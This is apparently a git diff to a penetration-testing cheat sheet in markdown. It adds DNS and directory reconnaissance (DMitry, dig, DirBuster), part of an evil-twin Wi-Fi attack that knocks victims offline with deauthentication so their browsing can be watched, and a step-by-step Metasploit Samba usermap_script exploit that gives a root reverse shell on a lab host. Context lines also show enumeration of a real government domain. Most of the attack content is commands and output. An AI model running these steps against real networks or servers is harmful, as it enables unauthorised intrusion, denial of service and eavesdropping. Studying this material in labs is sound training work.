@@ -158,7 +158,7 @@ address          mac                name             os_name     os_flavor  os_s
 222.127.142.213                                      Unknown                       device 
 ```
 
-### DNS Enumeration
+### DNS Enumeration/Scanning
 
 #### DNSRecon
 
@@ -244,6 +244,65 @@ msf6 auxiliary(gather/enum_dns) > run
 [*] Querying DNS TXT records for bjmp.gov.ph
 [*] Querying DNS SRV records for bjmp.gov.ph
 [*] Auxiliary module execution completed
+
+```
+
+#### Dmitry
+
+DMitry (Deepmagic Information Gathering Tool) is a UNIX/(GNU)Linux Command Line Application coded in C. DMitry has the ability to gather as much information as possible about a host. Base functionality is able to gather possible subdomains, email addresses, uptime information, tcp port scan, whois lookups, and more.
+
+```
+kali@kali:~$ dmitry -h                                                                                                   130 ⨯
+Deepmagic Information Gathering Tool
+"There be some deep magic going on"
+
+dmitry: invalid option -- 'h'
+Usage: dmitry [-winsepfb] [-t 0-9] [-o %host.txt] host
+  -o	 Save output to %host.txt or to file specified by -o file
+  -i	 Perform a whois lookup on the IP address of a host
+  -w	 Perform a whois lookup on the domain name of a host
+  -n	 Retrieve Netcraft.com information on a host
+  -s	 Perform a search for possible subdomains
+  -e	 Perform a search for possible email addresses
+  -p	 Perform a TCP port scan on a host
+* -f	 Perform a TCP port scan on a host showing output reporting filtered ports
+* -b	 Read in the banner received from the scanned port
+* -t 0-9 Set the TTL in seconds when scanning a TCP port ( Default 2 )
+*Requires the -p flagged to be passed
+```
+
+#### Dig and Host command
+
+```
+# dig megacorpone.com mx
+
+; <<>> DiG 9.16.12-Debian <<>> megacorpone.com mx
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 9084
+;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;megacorpone.com.		IN	MX
+
+;; ANSWER SECTION:
+megacorpone.com.	299	IN	MX	60 mail2.megacorpone.com.
+megacorpone.com.	299	IN	MX	10 fb.mail.gandi.net.
+megacorpone.com.	299	IN	MX	20 spool.mail.gandi.net.
+megacorpone.com.	299	IN	MX	50 mail.megacorpone.com.
+
+;; Query time: 232 msec
+;; SERVER: 8.8.8.8#53(8.8.8.8)
+;; WHEN: Sat Feb 27 18:47:14 EST 2021
+;; MSG SIZE  rcvd: 142
+
+# host -t mx megacorpone.com
+megacorpone.com mail is handled by 20 spool.mail.gandi.net.
+megacorpone.com mail is handled by 60 mail2.megacorpone.com.
+megacorpone.com mail is handled by 10 fb.mail.gandi.net.
+megacorpone.com mail is handled by 50 mail.megacorpone.com.
 
 ```
 
@@ -2173,6 +2232,18 @@ https://github.com/snoopysecurity/awesome-burp-extensions
 
 
 
+### DirBuster
+
+**DirBuster** is a multi threaded java application designed to brute force directories and files names on web/application servers.
+
+```
+root@kali:~# dirbuster&
+```
+
+Browse the wordlist at /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+
+![image-20210304150853300](images/dirbuster.png)
+
 ## Vulnerability Scanners
 
 ### NMAP
@@ -3888,3 +3959,102 @@ I recommend you to try eight digits and ten digits passwords (Numeric  chars). T
 
 21. Check out for active clients. The victim cannot access their internet connection until we stop the process. DHCP and deauth all will stop them from receiving any packets which make them shift to another network i.e. our fake access point or fake network signal In this process, A DOS attack is launched and the victim loses their internet connection and the victim see’s it as “Limited Connection” When you are at this step, you can even eavesdrop on the victim. you can see all the websites they surf, each and every detail is displayed in FAKE DNS
     Now I will show you what happens when the process is started Original network gets disconnected and our newly created fake network with the same name connects to victim’s network and a page pop’s up
+
+## Exploiting Linux Server
+
+### Samba Exploit
+
+**Getting Ready**
+
+1. First, will use the services command to display the results from our previous nmap scan and filter for ports 139 and 445:
+
+   ```
+   msf6 > services -c port,info -p 139,445 192.168.101.108
+   Services
+   ========
+   
+   host             port  info
+   ----             ----  ----
+   192.168.101.108  139   Samba smbd 3.X - 4.X workgroup: WORKGROUP
+   192.168.101.108  445   Samba smbd 3.X - 4.X workgroup: WORKGROUP
+   ```
+
+   
+
+2. Now that we know the version of the Samba daemon running, we can search for vulnerabilities and then use the search command to search for available exploits.
+
+   By doing some research online for **Common Vulnerabilities and Exposures** (**CVE**) related to Samba 3.0.20 on [https://www.cvedetails.com,](https://www.cvedetails.com/vulnerability-list.php?vendor_id=102&product_id=171&version_id=41384&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&month=0&cweid=0&order=3&trc=35&sha=f1a0c39b874e7afec0e84a7459c672610a42ad14) we can find some vulnerabilities we can exploit.
+
+   ```
+   msf6 > search cve:2007 type:exploit samba
+   
+   Matching Modules
+   ================
+   
+      #  Name                                       Disclosure Date  Rank       Check  Description
+      -  ----                                       ---------------  ----       -----  -----------
+      0  exploit/linux/samba/lsa_transnames_heap    2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
+      1  exploit/multi/samba/usermap_script         2007-05-14       excellent  No     Samba "username map script" Command Execution
+      2  exploit/osx/samba/lsa_transnames_heap      2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+      3  exploit/solaris/samba/lsa_transnames_heap  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   ```
+
+3. Using the search command and filtering by CVE, setting the type to display only exploits and the keyword samba, we get a couple of exploits that we might be able to use. Since we have an exploit with the rank of excellent we will check that first. 
+
+**How to do it**
+
+1. To select the exploit, employ the use command followed by the exploit name:
+
+   ```
+   msf6 > use exploit/multi/samba/usermap_script
+   
+   msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.101.108
+   RHOSTS => 192.168.101.108
+   msf6 exploit(multi/samba/usermap_script) > exploit
+   
+   [*] Started reverse TCP handler on 192.168.101.109:4444 
+   [*] Command shell session 4 opened (192.168.101.109:4444 -> 192.168.101.108:36143) at 2021-02-25 21:58:25 -0500
+   
+   hostname
+   metasploitable
+   whoami
+   root
+   ```
+
+   Upon successful execution of the exploit, we will be provided with shell connectivity with our target machine. To verify that we actually have access, we can type some Linux commands, such as the hostname command, to display the name of the machine, and to background the session we use *Ctrl* + *Z*. 
+
+2. To list the sessions
+
+   ```
+   msf6 exploit(multi/samba/usermap_script) > sessions -v
+   
+   Active sessions
+   ===============
+   
+     Session ID: 4
+           Name: 
+           Type: shell unix
+           Info: 
+         Tunnel: 192.168.101.109:4444 -> 192.168.101.108:36143 (192.168.101.108)
+            Via: exploit/multi/samba/usermap_script
+      Encrypted: No
+           UUID: 
+        CheckIn: <none>
+     Registered: No
+   ```
+
+3. To go back to the session, we use the sessions command followed by the -i option and the session ID; to abort the session we use *Ctrl* + *C*:
+
+   ```
+   msf6 exploit(multi/samba/usermap_script) > sessions -i 4
+   [*] Starting interaction with 4...
+   
+   hostname
+   metasploitable
+   whoami
+   root
+   ```
+
+
+## Exploiting Windows Server
+
